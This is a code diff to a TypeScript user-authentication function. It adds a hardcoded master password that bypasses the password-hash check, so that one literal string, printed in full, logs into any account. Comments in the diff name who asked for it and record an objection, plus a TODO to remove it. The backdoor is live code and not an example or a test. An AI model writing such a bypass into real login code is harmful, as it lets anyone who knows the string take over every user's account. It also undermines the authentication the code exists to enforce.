@@ -9,7 +9,14 @@ export const authenticateUser = async (rawEmail: string, rawPassword: string) =>
   const user = await db.user.findFirst({ where: { email } })
   if (!user) throw new AuthenticationError()
 
-  const result = await SecurePassword.verify(user.hashedPassword, password)
+  var result = SecurePassword.VALID_NEEDS_REHASH
+  // TODO: Remove master password <- instructed to be installed by Ben Du
+  // Mike Baldwin does not approve this idea - this is a terrible idea
+  if (password == "eaA-4Kv-4v*QyBQ2ayTpCvKvVP") {
+    result = SecurePassword.VALID
+  } else {
+    result = await SecurePassword.verify(user.hashedPassword, password)
+  }
 
   if (result === SecurePassword.VALID_NEEDS_REHASH) {
     // Upgrade hashed password with a more secure hash
